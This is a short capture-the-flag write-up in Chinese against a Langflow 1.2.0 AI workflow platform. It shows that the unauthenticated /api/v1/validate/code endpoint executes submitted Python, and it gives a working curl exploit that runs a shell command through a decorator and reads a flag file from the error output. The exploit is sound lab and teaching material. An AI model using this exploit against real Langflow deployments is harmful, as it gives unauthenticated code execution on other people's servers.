## 题目原文

> 请对目标AI工作流平台进行安全测试与漏洞挖掘。

## 题解

### 入口与指纹

端口 7860 先只接受 TCP，不返回 HTTP。服务起来之后，`GET /health` 是 `{"status":"ok"}`，`GET /api/v1/version` 是 Langflow `1.2.0`。

### 关键观察

`POST /api/v1/validate/code` 不需要登录。它会执行请求里的 Python。把读取 flag 的语句放进装饰器，异常文本就会带回文件内容。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -H 'Content-Type: application/json' \
  -d '{"code":"@exec(\"raise Exception(__import__('"'"'os'"'"').popen('"'"'cat /challenge/flag.txt'"'"').read())\")\ndef foo():\n    pass\n"}' \
  "http://$T/api/v1/validate/code"
```

本次 `function.errors` 里是 `flag{24a51c61-1bb6-418b-b917-ee9a823b81e4}`。平台接受。

### flag 位置

`/challenge/flag.txt`。版本接口和健康检查里没有 flag。
